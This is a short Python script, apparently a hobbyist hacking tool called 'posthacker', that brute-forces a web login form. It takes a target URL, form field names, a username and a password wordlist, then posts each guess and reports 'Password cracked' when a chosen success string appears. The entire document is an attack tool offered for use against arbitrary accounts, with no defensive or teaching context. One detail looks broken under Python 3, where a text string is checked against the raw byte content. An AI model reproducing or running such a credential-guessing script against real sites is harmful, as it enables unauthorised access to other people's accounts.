import requests

print('''
                      __  __               __            
    ____  ____  _____/ /_/ /_  ____ ______/ /_____  _____
   / __ \/ __ \/ ___/ __/ __ \/ __ `/ ___/ //_/ _ \/ ___/
  / /_/ / /_/ (__  ) /_/ / / / /_/ / /__/ ,< /  __/ /    
 / .___/\____/____/\__/_/ /_/\__,_/\___/_/|_|\___/_/     
/_/                                                      
coded by daytrift
''')

udacha = input("Write the successful banner:")
url = input("Write the url:")
w = input("Write the wordlist:")
uf = input("Write the username form:")
usr = input("Write the target username:")
pf = input("Write the password form:")
wrd = open(w, 'r').readlines()
for line in wrd:
    password = line.strip()
    http = requests.post(url, data={uf:usr, pf:password})
    content = http.content
    if udacha in content:
        print("Password cracked: " + password)
        break 
    else:
        print("Invalid password: " + password)
